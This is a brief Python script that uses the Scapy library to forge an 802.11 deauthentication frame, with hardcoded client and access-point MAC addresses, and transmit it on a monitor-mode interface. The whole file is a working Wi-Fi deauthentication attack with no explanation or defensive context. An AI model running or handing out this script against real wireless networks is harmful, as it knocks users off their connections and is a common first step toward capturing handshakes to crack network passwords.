#!/usr/bin/python

from scapy.all import *
import sys

deauth_pkt=RadioTap()/Dot11(addr1="DC:EE:06:E1:3C:78",addr2="4c:ed:de:e6:a0:98",addr3="4c:ed:de:e6:a0:98")/Dot11Deauth()
sendp(deauth_pkt,iface="mon0",count=1)
